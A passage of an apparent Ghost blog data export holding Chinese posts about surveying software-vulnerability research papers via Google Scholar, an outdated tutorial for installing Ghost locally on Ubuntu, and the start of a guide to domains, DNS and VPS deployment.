Scholar](https://scholar.google.com.sg/)，搜索<strong><em>software vulnerability</em></strong>，得到的搜索结果是这样的。\\n\\n![](/content/images/2015/07/4.JPG)\\n\\n很明显可以看到，第一篇的引用率高高在上，并且还是1998年的，所以应该错不了，所以先看这篇。打开之后发现是一篇普渡大学（Purdue University）的博士论文，先看一眼目录。\\n![](/content/images/2015/07/5.JPG)\\n![](/content/images/2015/07/6.JPG)\\n\\n可以看到它有对基本术语Error，Faults，Failure的辨析，有对软件漏洞的解释，有对分类的描述，并且相关工作描述了对漏洞的各种分类法，一看这就是我们需要的东西，并且如果相关工作写这些东西，那么此人做的应该也是分类的工作。从目录的情况也不难理解为何引用如此之多，这很明显是基础性的工作。\\n\\n然后我立刻跳转到Software Vulnerability，文章直接给出了现存的软件漏洞的三种定义，并且每种定义都给出了明确的出处。\\n![](/content/images/2015/07/7.JPG)\\n![](/content/images/2015/07/8.JPG)\\n![](/content/images/2015/07/9.JPG)\\n\\n考虑到论文的总结性质，引用率，以及1977年之后才有超大规模集成电路，那么如果继续追溯去读这三篇给出定义的文章，基本上就可以认为读到源头了，以后这就是本领域的基础。\\n\\n这时我想到你貌似发过一篇笔记的照片给我，我去翻了翻，突然发现你总结的就是这三个定义的中文翻译版，所以你应该感到高兴，你走在了***正确的道路上***。\\n\\n在后续的章节中，文章还重点介绍了Taxonomy 和 Classification 和定义本身的各种辨析，介绍了漏洞的各种分类，没细看，但的确有利于修炼内功和打基础。\\n\\n接着顺着Scholar的结果往下看，我又分别扫了两眼以下几篇，扫的时候只溜了溜摘要和几句Introduction\\n![](/content/images/2015/07/10.JPG)\\n![](/content/images/2015/07/11.JPG)\\n![](/content/images/2015/07/12.JPG)\\n\\n第一篇是一个调查，Scholar上面有几篇类似的，貌似是从软工的角度去写的，关注的是life cycles，第二篇提出了一种工具，侧重于检测，目测是静态分析工具，Scholar上也有一些做检测的，第三篇摘要给出了一个软件漏洞的简要定义，然后说漏洞分析分为静态分析和动态分析两种，然后它自己鼓捣出了一个动态的给大伙看看。\\n\\n懒得再看更多了，总共用了一个小时左右吧，基本上的直觉是（直觉不一定是对的）：\\n\\n1. 软件漏洞大致有分析（analysis），检测（detection），测试（testing）等等分支，另外有几篇调查性质的没细看它们在做什么，如何归类。\\n2. 那篇博士论文非常重要，辨析了众多术语，以及不同概念之间的细微差异，是内功。\\n3. 动态分析和静态分析是工具，在文章中看到了几个熟悉的工具名字。\\n\\n这就是我从零开始了解一个东西的过程，如果让我继续做下去，我会考虑这么几点：\\n\\n1. 是不是分析，检测，测试等等都让我调研，还是只调研其中某个方面。\\n2. 顺着scholar的搜索结果统计，看看有多少分析的，多少检测的等等，做个数量分类；大致看看每篇文章的参考文献，看看他们相关工作引用的文章，和Scholar的结果做个对照，整体把握一下文章数量。\\n2. 在找到的分析和检测的文章中，顺着参考文献找下去，统计下常用的静态和动态的工具，统计下他们互相说的对方的优缺点。这已经可以构成不少调研报告的内容。\\n3. 抽空细读那篇有各种定义和分类辨析的论文，打打基础。\\n\\n如果需要本文展示的文章，请点击[这里](http://pan.baidu.com/s/1e4zd8)下载。\\n\\n---\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>今天上午有点时间，就模拟了一把读论文，首先是打开<a href=\"https://scholar.google.com.sg/\">Google Scholar</a>，搜索<strong><em>software vulnerability</em></strong>，得到的搜索结果是这样的。</p>\n<p><img src=\"/content/images/2015/07/4.JPG\" alt=\"\"></p>\n<p>很明显可以看到，第一篇的引用率高高在上，并且还是1998年的，所以应该错不了，所以先看这篇。打开之后发现是一篇普渡大学（Purdue University）的博士论文，先看一眼目录。<br>\n<img src=\"/content/images/2015/07/5.JPG\" alt=\"\"><br>\n<img src=\"/content/images/2015/07/6.JPG\" alt=\"\"></p>\n<p>可以看到它有对基本术语Error，Faults，Failure的辨析，有对软件漏洞的解释，有对分类的描述，并且相关工作描述了对漏洞的各种分类法，一看这就是我们需要的东西，并且如果相关工作写这些东西，那么此人做的应该也是分类的工作。从目录的情况也不难理解为何引用如此之多，这很明显是基础性的工作。</p>\n<p>然后我立刻跳转到Software Vulnerability，文章直接给出了现存的软件漏洞的三种定义，并且每种定义都给出了明确的出处。<br>\n<img src=\"/content/images/2015/07/7.JPG\" alt=\"\"><br>\n<img src=\"/content/images/2015/07/8.JPG\" alt=\"\"><br>\n<img src=\"/content/images/2015/07/9.JPG\" alt=\"\"></p>\n<p>考虑到论文的总结性质，引用率，以及1977年之后才有超大规模集成电路，那么如果继续追溯去读这三篇给出定义的文章，基本上就可以认为读到源头了，以后这就是本领域的基础。</p>\n<p>这时我想到你貌似发过一篇笔记的照片给我，我去翻了翻，突然发现你总结的就是这三个定义的中文翻译版，所以你应该感到高兴，你走在了***正确的道路上***。</p>\n<p>在后续的章节中，文章还重点介绍了Taxonomy 和 Classification 和定义本身的各种辨析，介绍了漏洞的各种分类，没细看，但的确有利于修炼内功和打基础。</p>\n<p>接着顺着Scholar的结果往下看，我又分别扫了两眼以下几篇，扫的时候只溜了溜摘要和几句Introduction<br>\n<img src=\"/content/images/2015/07/10.JPG\" alt=\"\"><br>\n<img src=\"/content/images/2015/07/11.JPG\" alt=\"\"><br>\n<img src=\"/content/images/2015/07/12.JPG\" alt=\"\"></p>\n<p>第一篇是一个调查，Scholar上面有几篇类似的，貌似是从软工的角度去写的，关注的是life cycles，第二篇提出了一种工具，侧重于检测，目测是静态分析工具，Scholar上也有一些做检测的，第三篇摘要给出了一个软件漏洞的简要定义，然后说漏洞分析分为静态分析和动态分析两种，然后它自己鼓捣出了一个动态的给大伙看看。</p>\n<p>懒得再看更多了，总共用了一个小时左右吧，基本上的直觉是（直觉不一定是对的）：</p>\n<ol>\n<li>软件漏洞大致有分析（analysis），检测（detection），测试（testing）等等分支，另外有几篇调查性质的没细看它们在做什么，如何归类。</li>\n<li>那篇博士论文非常重要，辨析了众多术语，以及不同概念之间的细微差异，是内功。</li>\n<li>动态分析和静态分析是工具，在文章中看到了几个熟悉的工具名字。</li>\n</ol>\n<p>这就是我从零开始了解一个东西的过程，如果让我继续做下去，我会考虑这么几点：</p>\n<ol>\n<li>是不是分析，检测，测试等等都让我调研，还是只调研其中某个方面。</li>\n<li>顺着scholar的搜索结果统计，看看有多少分析的，多少检测的等等，做个数量分类；大致看看每篇文章的参考文献，看看他们相关工作引用的文章，和Scholar的结果做个对照，整体把握一下文章数量。</li>\n<li>在找到的分析和检测的文章中，顺着参考文献找下去，统计下常用的静态和动态的工具，统计下他们互相说的对方的优缺点。这已经可以构成不少调研报告的内容。</li>\n<li>抽空细读那篇有各种定义和分类辨析的论文，打打基础。</li>\n</ol>\n<p>如果需要本文展示的文章，请点击<a href=\"http://pan.baidu.com/s/1e4zd8\">这里</a>下载。</p>\n<hr>\n</div>","amp":"6","plaintext":"今天上午有点时间，就模拟了一把读论文，首先是打开Google Scholar [https://scholar.google.com.sg/]，搜索\nsoftware vulnerability，得到的搜索结果是这样的。\n\n\n\n很明显可以看到，第一篇的引用率高高在上，并且还是1998年的，所以应该错不了，所以先看这篇。打开之后发现是一篇普渡大学（Purdue\nUniversity）的博士论文，先看一眼目录。\n\n\n\n可以看到它有对基本术语Error，Faults，Failure的辨析，有对软件漏洞的解释，有对分类的描述，并且相关工作描述了对漏洞的各种分类法，一看这就是我们需要的东西，并且如果相关工作写这些东西，那么此人做的应该也是分类的工作。从目录的情况也不难理解为何引用如此之多，这很明显是基础性的工作。\n\n然后我立刻跳转到Software Vulnerability，文章直接给出了现存的软件漏洞的三种定义，并且每种定义都给出了明确的出处。\n\n\n\n\n考虑到论文的总结性质，引用率，以及1977年之后才有超大规模集成电路，那么如果继续追溯去读这三篇给出定义的文章，基本上就可以认为读到源头了，以后这就是本领域的基础。\n\n这时我想到你貌似发过一篇笔记的照片给我，我去翻了翻，突然发现你总结的就是这三个定义的中文翻译版，所以你应该感到高兴，你走在了***正确的道路上***。\n\n在后续的章节中，文章还重点介绍了Taxonomy 和 Classification\n和定义本身的各种辨析，介绍了漏洞的各种分类，没细看，但的确有利于修炼内功和打基础。\n\n接着顺着Scholar的结果往下看，我又分别扫了两眼以下几篇，扫的时候只溜了溜摘要和几句Introduction\n\n\n\n\n第一篇是一个调查，Scholar上面有几篇类似的，貌似是从软工的角度去写的，关注的是life\ncycles，第二篇提出了一种工具，侧重于检测，目测是静态分析工具，Scholar上也有一些做检测的，第三篇摘要给出了一个软件漏洞的简要定义，然后说漏洞分析分为静态分析和动态分析两种，然后它自己鼓捣出了一个动态的给大伙看看。\n\n懒得再看更多了，总共用了一个小时左右吧，基本上的直觉是（直觉不一定是对的）：\n\n 1. 软件漏洞大致有分析（analysis），检测（detection），测试（testing）等等分支，另外有几篇调查性质的没细看它们在做什么，如何归类。\n 2. 那篇博士论文非常重要，辨析了众多术语，以及不同概念之间的细微差异，是内功。\n 3. 动态分析和静态分析是工具，在文章中看到了几个熟悉的工具名字。\n\n这就是我从零开始了解一个东西的过程，如果让我继续做下去，我会考虑这么几点：\n\n 1. 是不是分析，检测，测试等等都让我调研，还是只调研其中某个方面。\n 2. 顺着scholar的搜索结果统计，看看有多少分析的，多少检测的等等，做个数量分类；大致看看每篇文章的参考文献，看看他们相关工作引用的文章，和Scholar的结果做个对照，整体把握一下文章数量。\n 3. 在找到的分析和检测的文章中，顺着参考文献找下去，统计下常用的静态和动态的工具，统计下他们互相说的对方的优缺点。这已经可以构成不少调研报告的内容。\n 4. 抽空细读那篇有各种定义和分类辨析的论文，打打基础。\n\n如果需要本文展示的文章，请点击这里 [http://pan.baidu.com/s/1e4zd8]下载。\n\n\n--------------------------------------------------------------------------------","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2015-07-05T06:32:29.000Z","created_by":"1","updated_at":"2015-07-07T03:01:50.000Z","updated_by":"1","published_at":"2015-07-05T08:11:58.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null},{"id":"59bccd6bf9a5a920fc140c3c","uuid":"f7339cad-c6c6-4782-95f0-25e62f5bc63a","title":"基于 Ghost 搭建个人博客-本地搭建(已过时)","slug":"bo-ke-xian-xia","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"**由于 Ghost 已更新到V1.x, 本文已过时, 不具有参考意义**\\n\\n[Ghost](https://ghost.org/) 是一套基于 Node.js 构建的开源博客平台，十分简洁易用，博客后台默认采用 Markdown 语法书写文章，十分方便。\\n\\nGhost 是由 WordPress UI 部门前主管 John O’Nolan 和 WordPress 开发人员 Hannah Wolfe 创立的，与 WordPress 相比较，它最大的优势就是完全从头写起，它仅仅是一个博客，不像 WordPress，已经慢慢变得更像一个 CMS。\\n\\n本文主要介绍如何在个人电脑上搭建一个 Ghost 博客，供自己测试和感受，下一篇文章将介绍如何在线上环境配置 Ghost，本文所使用的环境为 Ubuntu 14.04 LTS x86_64。\\n\\n先安装一下基本的编译环境\\n\\n    sudo apt-get update\\n    sudo apt-get install build-essential zip vim\\n\\n\\n##安装 Node.js\\nNode.js 目前有 0.10.x 和 0.12.x 两种版本，按照官方文档的说法，更推荐使用 0.10.x 版本，本文使用的是 Node.js 0.10.36，下载地址是 https://nodejs.org/dist/v0.10.36 下载源码后，cd 到一个你觉得合适的目录。\\n<pre><code lang=\\\"shell\\\">\\ntar xvzf node-v0.10.36-linux-x64.tar.gz\\ncd node-v0.10.36\\n./configure\\nmake\\nsudo make install\\n</code>\\n</pre>\\n安装完之后，使用`node-v`命令查看一下版本号，如果能正确显示，则表明安装没有问题。\\n##安装 npm\\nnpm 推荐使用 2.5.0 版本，所以还需要单独再装一下 npm。下载地址是 https://github.com/npm/npm/releases/tag/v2.5.0\\n下载完毕后，同样 cd 到一个合适的目录。\\n\\n    tar xvzf v2.5.0.tar.gz\\n    cd npm-2.5.0\\n    ./configure\\n    make\\n    sudo make install\\n安装完毕后，同样使用`npm-v`命令查看一下版本，如果正确显示，则表明没有问题。\\n\\n##安装 Ghost\\n在/var/www目录下新建一个目录存放 Ghost，我将其命名为 ghost\\n\\n    mkdir /var/www/ghost\\n下载最新版的 Ghost 源文件，截至成稿，最新版为 0.6.3，Ghost 目前有中文版，中文集成版，英文原版三种。中文版和英文版在安装过程中需要联网下载一些东西，而这个过程在国内可能被墙导致失败，中文集成版则由于集成了这些下载的东西，于是跳过了安装步骤，可以直接使用。\\n\\n本文使用的是中文集成版，下载地址是：http://dl.ghostchina.com/Ghost-0.6.3-zh-full.zip\\n\\n下载完毕后，cd 到刚才创建的 ghost 目录，解压缩即可。\\n\\n    cd /var/www/ghost\\n    unzip /path/to/Ghost-0.6.3-zh-full.zip\\n\\n如果你使用的是中文版或者英文原版，此时需要执行安装命令。如果你使用的是中文集成版，则跳过此步骤\\n\\n    sudo npm install --production\\n现在，Ghost 已经可以运行了，执行\\n\\n    npm start \\n此时，Ghost 已经在开发模式下运行，默认端口是 2368，打开浏览器，输入 127.0.0.1:2368 即可看到博客的欢迎界面。输入 127.0.0.1:2368/ghost 可以进入博客后台。\\n\\n\\n\\n##使用\\n1. 目前为止，Ghost 已经可以运行了，可以下载一些别人的主题，放在 `/content/themes/`目录下，之后重启 Ghost，在后台的设置页面对主题进行选择。\\n\\n2. 重启的方式很简单，因为是在终端运行，所以`ctrl + c`即可停止，之后再次 `npm start`即可重新运行。\\n\\n3. 如果你有基本的前端知识，可以对已有的主题或下载的主题进行细微的调整，使之更符合自己的习惯。\\n\\n4. Ghost 有不同的运行模式。除去前文默认使用的开发模式，还可以使用命令 `npm start --production`让其以生产模式运行。根据 Ghost 官方的说法，如果你在线上环境使用 Ghost，那么应该让其运行在生产模式（production）。如果让我来做一个比喻的话，那么我理解 Ghost 开发模式和生产模式的区别，就类似编译程序时 Debug 版和 Release 版的区别。\\n\\n5. 开发模式和生产模式生成不同的数据库，配置也不通用，所以你分别用两种模式运行，会发现自己需要配置两遍。如果真的上线，只配置和使用生产模式即可。\\n\\n---\\n##更新\\n\\n* 2016-12, ghost更新至最新版本，使用英文原版，不再单独安装 npm。\\n* node.js 使用6.9.0.下载地址：https://nodejs.org/download/release/v6.9.0/node-v6.9.0.tar.gz\\n* Ubuntu更新至16.04，后台更换到日本 conoha VPS\\n\\n---\\n##更新 \\n* 2017-02-25 conoha 国内速度太差，后台更换至 Linode \\n* Linode ubuntu `\\\"Connecting to security.ubuntu.com (2001:67c:1562::16)\\\"` 错误，解决方案，编辑 `/etc/gai.conf` 取消掉下面的注释。\\n<pre><code>#\\n# For sites which prefer IPv4 connections change the last line to\\n#\\nprecedence ::ffff:0:0/96 100\\n</code>\\n</pre>\\n* git clone 到指定目录的方法\\n`git clone xxx.git \\\"指定目录\\\"`\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p><strong>由于 Ghost 已更新到V1.x, 本文已过时, 不具有参考意义</strong></p>\n<p><a href=\"https://ghost.org/\">Ghost</a> 是一套基于 Node.js 构建的开源博客平台，十分简洁易用，博客后台默认采用 Markdown 语法书写文章，十分方便。</p>\n<p>Ghost 是由 WordPress UI 部门前主管 John O’Nolan 和 WordPress 开发人员 Hannah Wolfe 创立的，与 WordPress 相比较，它最大的优势就是完全从头写起，它仅仅是一个博客，不像 WordPress，已经慢慢变得更像一个 CMS。</p>\n<p>本文主要介绍如何在个人电脑上搭建一个 Ghost 博客，供自己测试和感受，下一篇文章将介绍如何在线上环境配置 Ghost，本文所使用的环境为 Ubuntu 14.04 LTS x86_64。</p>\n<p>先安装一下基本的编译环境</p>\n<pre><code>sudo apt-get update\nsudo apt-get install build-essential zip vim\n</code></pre>\n<h2 id=\"nodejs\">安装 Node.js</h2>\n<p>Node.js 目前有 0.10.x 和 0.12.x 两种版本，按照官方文档的说法，更推荐使用 0.10.x 版本，本文使用的是 Node.js 0.10.36，下载地址是 <a href=\"https://nodejs.org/dist/v0.10.36\">https://nodejs.org/dist/v0.10.36</a> 下载源码后，cd 到一个你觉得合适的目录。</p>\n<pre><code lang=\"shell\">\ntar xvzf node-v0.10.36-linux-x64.tar.gz\ncd node-v0.10.36\n./configure\nmake\nsudo make install\n</code>\n</pre>\n<p>安装完之后，使用<code>node-v</code>命令查看一下版本号，如果能正确显示，则表明安装没有问题。</p>\n<h2 id=\"npm\">安装 npm</h2>\n<p>npm 推荐使用 2.5.0 版本，所以还需要单独再装一下 npm。下载地址是 <a href=\"https://github.com/npm/npm/releases/tag/v2.5.0\">https://github.com/npm/npm/releases/tag/v2.5.0</a><br>\n下载完毕后，同样 cd 到一个合适的目录。</p>\n<pre><code>tar xvzf v2.5.0.tar.gz\ncd npm-2.5.0\n./configure\nmake\nsudo make install\n</code></pre>\n<p>安装完毕后，同样使用<code>npm-v</code>命令查看一下版本，如果正确显示，则表明没有问题。</p>\n<h2 id=\"ghost\">安装 Ghost</h2>\n<p>在/var/www目录下新建一个目录存放 Ghost，我将其命名为 ghost</p>\n<pre><code>mkdir /var/www/ghost\n</code></pre>\n<p>下载最新版的 Ghost 源文件，截至成稿，最新版为 0.6.3，Ghost 目前有中文版，中文集成版，英文原版三种。中文版和英文版在安装过程中需要联网下载一些东西，而这个过程在国内可能被墙导致失败，中文集成版则由于集成了这些下载的东西，于是跳过了安装步骤，可以直接使用。</p>\n<p>本文使用的是中文集成版，下载地址是：<a href=\"http://dl.ghostchina.com/Ghost-0.6.3-zh-full.zip\">http://dl.ghostchina.com/Ghost-0.6.3-zh-full.zip</a></p>\n<p>下载完毕后，cd 到刚才创建的 ghost 目录，解压缩即可。</p>\n<pre><code>cd /var/www/ghost\nunzip /path/to/Ghost-0.6.3-zh-full.zip\n</code></pre>\n<p>如果你使用的是中文版或者英文原版，此时需要执行安装命令。如果你使用的是中文集成版，则跳过此步骤</p>\n<pre><code>sudo npm install --production\n</code></pre>\n<p>现在，Ghost 已经可以运行了，执行</p>\n<pre><code>npm start \n</code></pre>\n<p>此时，Ghost 已经在开发模式下运行，默认端口是 2368，打开浏览器，输入 127.0.0.1:2368 即可看到博客的欢迎界面。输入 127.0.0.1:2368/ghost 可以进入博客后台。</p>\n<h2 id=\"\">使用</h2>\n<ol>\n<li>\n<p>目前为止，Ghost 已经可以运行了，可以下载一些别人的主题，放在 <code>/content/themes/</code>目录下，之后重启 Ghost，在后台的设置页面对主题进行选择。</p>\n</li>\n<li>\n<p>重启的方式很简单，因为是在终端运行，所以<code>ctrl + c</code>即可停止，之后再次 <code>npm start</code>即可重新运行。</p>\n</li>\n<li>\n<p>如果你有基本的前端知识，可以对已有的主题或下载的主题进行细微的调整，使之更符合自己的习惯。</p>\n</li>\n<li>\n<p>Ghost 有不同的运行模式。除去前文默认使用的开发模式，还可以使用命令 <code>npm start --production</code>让其以生产模式运行。根据 Ghost 官方的说法，如果你在线上环境使用 Ghost，那么应该让其运行在生产模式（production）。如果让我来做一个比喻的话，那么我理解 Ghost 开发模式和生产模式的区别，就类似编译程序时 Debug 版和 Release 版的区别。</p>\n</li>\n<li>\n<p>开发模式和生产模式生成不同的数据库，配置也不通用，所以你分别用两种模式运行，会发现自己需要配置两遍。如果真的上线，只配置和使用生产模式即可。</p>\n</li>\n</ol>\n<hr>\n<h2 id=\"\">更新</h2>\n<ul>\n<li>2016-12, ghost更新至最新版本，使用英文原版，不再单独安装 npm。</li>\n<li>node.js 使用6.9.0.下载地址：<a href=\"https://nodejs.org/download/release/v6.9.0/node-v6.9.0.tar.gz\">https://nodejs.org/download/release/v6.9.0/node-v6.9.0.tar.gz</a></li>\n<li>Ubuntu更新至16.04，后台更换到日本 conoha VPS</li>\n</ul>\n<hr>\n<h2 id=\"\">更新</h2>\n<ul>\n<li>2017-02-25 conoha 国内速度太差，后台更换至 Linode</li>\n<li>Linode ubuntu <code>&quot;Connecting to security.ubuntu.com (2001:67c:1562::16)&quot;</code> 错误，解决方案，编辑 <code>/etc/gai.conf</code> 取消掉下面的注释。</li>\n</ul>\n<pre><code>#\n# For sites which prefer IPv4 connections change the last line to\n#\nprecedence ::ffff:0:0/96 100\n</code>\n</pre>\n<ul>\n<li>git clone 到指定目录的方法<br>\n<code>git clone xxx.git &quot;指定目录&quot;</code></li>\n</ul>\n</div>","amp":"7","plaintext":"由于 Ghost 已更新到V1.x, 本文已过时, 不具有参考意义\n\nGhost [https://ghost.org/]  是一套基于 Node.js 构建的开源博客平台，十分简洁易用，博客后台默认采用 Markdown\n语法书写文章，十分方便。\n\nGhost 是由 WordPress UI 部门前主管 John O’Nolan 和 WordPress 开发人员 Hannah Wolfe 创立的，与\nWordPress 相比较，它最大的优势就是完全从头写起，它仅仅是一个博客，不像 WordPress，已经慢慢变得更像一个 CMS。\n\n本文主要介绍如何在个人电脑上搭建一个 Ghost 博客，供自己测试和感受，下一篇文章将介绍如何在线上环境配置 Ghost，本文所使用的环境为 Ubuntu\n14.04 LTS x86_64。\n\n先安装一下基本的编译环境\n\nsudo apt-get update\nsudo apt-get install build-essential zip vim\n\n\n安装 Node.js\nNode.js 目前有 0.10.x 和 0.12.x 两种版本，按照官方文档的说法，更推荐使用 0.10.x 版本，本文使用的是 Node.js\n0.10.36，下载地址是 https://nodejs.org/dist/v0.10.36  下载源码后，cd 到一个你觉得合适的目录。\n\n\ntar xvzf node-v0.10.36-linux-x64.tar.gz\ncd node-v0.10.36\n./configure\nmake\nsudo make install\n\n\n\n安装完之后，使用node-v命令查看一下版本号，如果能正确显示，则表明安装没有问题。\n\n安装 npm\nnpm 推荐使用 2.5.0 版本，所以还需要单独再装一下 npm。下载地址是 \nhttps://github.com/npm/npm/releases/tag/v2.5.0\n下载完毕后，同样 cd 到一个合适的目录。\n\ntar xvzf v2.5.0.tar.gz\ncd npm-2.5.0\n./configure\nmake\nsudo make install\n\n\n安装完毕后，同样使用npm-v命令查看一下版本，如果正确显示，则表明没有问题。\n\n安装 Ghost\n在/var/www目录下新建一个目录存放 Ghost，我将其命名为 ghost\n\nmkdir /var/www/ghost\n\n\n下载最新版的 Ghost 源文件，截至成稿，最新版为 0.6.3，Ghost\n目前有中文版，中文集成版，英文原版三种。中文版和英文版在安装过程中需要联网下载一些东西，而这个过程在国内可能被墙导致失败，中文集成版则由于集成了这些下载的东西，于是跳过了安装步骤，可以直接使用。\n\n本文使用的是中文集成版，下载地址是：http://dl.ghostchina.com/Ghost-0.6.3-zh-full.zip\n\n下载完毕后，cd 到刚才创建的 ghost 目录，解压缩即可。\n\ncd /var/www/ghost\nunzip /path/to/Ghost-0.6.3-zh-full.zip\n\n\n如果你使用的是中文版或者英文原版，此时需要执行安装命令。如果你使用的是中文集成版，则跳过此步骤\n\nsudo npm install --production\n\n\n现在，Ghost 已经可以运行了，执行\n\nnpm start \n\n\n此时，Ghost 已经在开发模式下运行，默认端口是 2368，打开浏览器，输入 127.0.0.1:2368 即可看到博客的欢迎界面。输入\n127.0.0.1:2368/ghost 可以进入博客后台。\n\n使用\n 1. 目前为止，Ghost 已经可以运行了，可以下载一些别人的主题，放在 /content/themes/目录下，之后重启\n    Ghost，在后台的设置页面对主题进行选择。\n    \n    \n 2. 重启的方式很简单，因为是在终端运行，所以ctrl + c即可停止，之后再次 npm start即可重新运行。\n    \n    \n 3. 如果你有基本的前端知识，可以对已有的主题或下载的主题进行细微的调整，使之更符合自己的习惯。\n    \n    \n 4. Ghost 有不同的运行模式。除去前文默认使用的开发模式，还可以使用命令 npm start --production让其以生产模式运行。根据\n    Ghost 官方的说法，如果你在线上环境使用 Ghost，那么应该让其运行在生产模式（production）。如果让我来做一个比喻的话，那么我理解\n    Ghost 开发模式和生产模式的区别，就类似编译程序时 Debug 版和 Release 版的区别。\n    \n    \n 5. 开发模式和生产模式生成不同的数据库，配置也不通用，所以你分别用两种模式运行，会发现自己需要配置两遍。如果真的上线，只配置和使用生产模式即可。\n    \n    \n\n\n--------------------------------------------------------------------------------\n\n更新\n * 2016-12, ghost更新至最新版本，使用英文原版，不再单独安装 npm。\n * node.js 使用6.9.0.下载地址：\n   https://nodejs.org/download/release/v6.9.0/node-v6.9.0.tar.gz\n * Ubuntu更新至16.04，后台更换到日本 conoha VPS\n\n\n--------------------------------------------------------------------------------\n\n更新\n * 2017-02-25 conoha 国内速度太差，后台更换至 Linode\n * Linode ubuntu \"Connecting to security.ubuntu.com (2001:67c:1562::16)\" \n   错误，解决方案，编辑 /etc/gai.conf  取消掉下面的注释。\n\n#\n# For sites which prefer IPv4 connections change the last line to\n#\nprecedence ::ffff:0:0/96 100\n\n\n\n * git clone 到指定目录的方法\n   git clone xxx.git \"指定目录\"","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2015-07-06T04:51:13.000Z","created_by":"1","updated_at":"2017-09-16T13:34:45.000Z","updated_by":"1","published_at":"2015-07-06T05:53:38.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null},{"id":"59bccd6bf9a5a920fc140c3d","uuid":"438d3461-094a-4990-8619-692fae2f7d1a","title":"基于 Ghost 搭建个人博客-部署上线(已过时)","slug":"bo-ke-xian-shang","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"**由于 Ghost 已更新到V1.x, 线上配置和运行部分已过时**\\n\\n前文介绍了如何在本机上搭建一个 Ghost 博客来进行体验，本文介绍如何在线上环境，即 VPS 上配置 Ghost，使其真正成为别人可以访问和浏览的个人网站。\\n\\n本文的内容分为：\\n\\n1. 域名注册\\n2. DNS 解析设置\\n3. VPS 购买\\n4. 线上配置和运行 Ghost\\n\\n##域名注册\\n想要拥有一个个人网站，或者说个人博客，注册一个域名是十分重要的。当然，你可以不用域名，让大家直接用 IP 地址来访问，但这样很明显用户体验不够友好，所以首先介绍一下如何注册一个有个性的域名。\\n\\n域名的来源多种多样，有免费的，有花钱的，据说 GitHub 可以提供一年免费的 me 域名，我没有尝试过。也有不少人将个人网站以 GitHub Page 的形式建在 GitHub 上，这种解决方案不是本文的讨论范围。\\n\\n域名一般来讲都是花钱的，除去主流的常见顶级域名（比如本站用的 .com），现在还有 .info、.io、.tips、.xyz、.today 等等各种不常见的域名。一般注册域名需要找域名注册商，国内和国外均有。国外比较有名的老牌注册商有 [GoDaddy](https://www.godaddy.com)，[Namecheap](https://www.namecheap.com/) 等等。\\n\\n本站域名是在 GoDaddy 进行注册的，注册 GoDaddy 域名需要在它的官方网站注册一个账户，另外需要一张可以国际支付的信用卡，没有信用卡的话，可以选择淘宝 GoDaddy 代购服务。\\n\\n首先是在 GoDaddy 官方网站对自己想注册的域名进行搜索，看看是否已经被人注册过，如果没有的话，那么恭喜你，你可以顺利地成为这个域名的主人了。之后就是按照流程进行支付，如果选择代购的话，代购者会在支付过后将域名过户（Push）给你。\\n\\n域名注册完毕后，在个人账户下可以看到自己拥有的域名并对其进行管理。\\n<br />\\n![](/content/images/2015/07/godaddy1.JPG)\\n<br />\\n点击 manage 后，比较重要的就是对 Nameservers 的设置，GoDaddy 有提供 DNS 解析的服务，但 GoDaddy 的 Nameservers 在国内不是很稳定，所以一般会将其改成国内的 DNSPod 提供的名字解析服务器，本站的设置为\\n<br />\\n![](/content/images/2015/07/godaddy2.JPG)\\n<br />\\n\\n至于这两个 Nameservers 的地址是如何来的，下节会说明。\\n\\n##DNS 解析设置\\n在国内的话，一般是推荐使用 [DNSPod](https://www.dnspod.cn/) 的解析服务，这个服务是免费的。在官方网站注册一个账号（或用 QQ 号登陆）后，即可以添加想解析的域名。\\n\\n添加域名后，DNSPod 会自动生成两个默认的 NS 记录，指定了域名解析服务器。然后将上文域名注册商那里的 NS 记录，改成 DNSPod 提供两个服务器即可。\\n<br />\\n![](/content/images/2015/07/dnspod1.JPG)\\n<br />\\n\\n之后，就是在 DNSPod 上添加 A 记录，将域名解析到自己购买的 VPS 的 IP 地址上。域名注册商那边的 NS 更改，以及 DNSPod 这边的解析记录添加和更改，都需要等待一定的时间才能生效，本人的等待时间在半个小时左右。\\n\\n##VPS 购买\\nVPS 是指（Virtual Private Server），购买的是服务器上开出的一个虚拟机，租用独立的服务器价格较高，对于个人网站这种应用，购买一个 VPS 就已经足够了。\\n比较有名的 VPS 提供商有 [Amazon EC2](http://aws.amazon.com/ec2)， [Linode](https://www.linode.com/) 和 [DigitalOcean](https://www.digitalocean.com/) 等等，目前，DigitalOcean 首月使用是免费的，但需要一张可以国际支付的信用卡。因为本人目前没有信用卡，所以目前使用淘宝购买的日本 VPS，根据目前的体验，速度和稳定性都很好，只是不像 Linode 和 DigitalOcean 那样可以自己管理。\\n\\n国内也有 BAT 等公司提供云主机服务，但国内上线网站需要进行备案，十分麻烦，除非有特别需要，否则不推荐使用国内的主机。\\n\\n总之，购买 VPS 可以通过信用卡自己注册和购买，也可以淘宝代购。\\n\\n##线上配置和运行 Ghost\\n购买 VPS 后，会得到一个可用的服务器和 IP 地址，将域名和 IP 地址做好解析之后，一切准备工作就完成了。接下来我们可以在 VPS 上上线自己的网站了。\\n\\n如果使用 Windows 系统的话，可以使用 SecureCRT 远程登陆 VPS，Linux 系统的话，直接使用 ssh 命令即可，如果登陆不了，要确认一下 VPS 开放的是否是 22 端口，以及是否开启了 ssh 服务。\\n\\n基本的安装流程同上一篇的本地搭建是一样的。首先是给 VPS 安装基本的编译环境，以及 Vim 等工具，然后安装 Node.js 和 npm，最后安装 Ghost，需要注意的是，由于 VPS 